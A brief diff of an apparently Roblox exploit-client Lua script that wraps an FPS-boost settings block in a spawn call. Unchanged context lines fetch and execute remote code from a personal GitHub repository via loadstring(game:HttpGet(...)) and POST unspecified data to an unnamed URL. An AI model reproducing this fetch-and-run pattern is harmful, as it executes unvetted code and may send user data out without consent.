@@ -34,6 +34,7 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
+spawn(function()
 _G.Settings = {
     Players = {
         ["Ignore Me"] = true, -- Ignore your Character
@@ -58,6 +59,7 @@ _G.Settings = {
     ["Low Quality Parts"] = true -- Lower quality parts
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0438785795/fpsbootser/main/nocrash.lua"))()
+end)
 
 -- EARTH
 
